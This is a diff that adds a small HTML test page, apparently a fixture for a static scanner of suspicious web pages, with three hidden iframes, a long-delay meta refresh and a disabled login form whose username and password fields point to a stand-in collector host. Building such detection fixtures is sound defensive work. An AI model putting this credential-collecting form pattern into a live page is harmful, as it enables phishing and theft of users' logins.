@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="zh-Hant"><head><meta charset="utf-8"><title>Demo 03 - 多重安全警示</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body>
+<h1>可疑網頁結構測試（請勿輸入真實資料）</h1>
+<p>只供靜態掃描，不會將資料送往任何主機。</p>
+<iframe title="hidden-1" srcdoc="<p>離線內容 1</p>" style="display:none"></iframe>
+<iframe title="hidden-2" srcdoc="<p>離線內容 2</p>" hidden></iframe>
+<iframe title="hidden-3" srcdoc="<p>離線內容 3</p>" style="visibility:hidden"></iframe>
+<form action="https://receiver.example.net/collect" method="post" onsubmit="return false;">
+<label>測試帳號 <input type="text" name="test_user"></label>
+<label>測試密碼 <input type="password" name="test_pass"></label>
+<input type="hidden" name="verification" value="DEMO_ONLY">
+<button type="submit" disabled>停用的測試提交按鈕</button>
+</form>
+<meta http-equiv="refresh" content="999999;url=about:blank">
+
+</body></html>
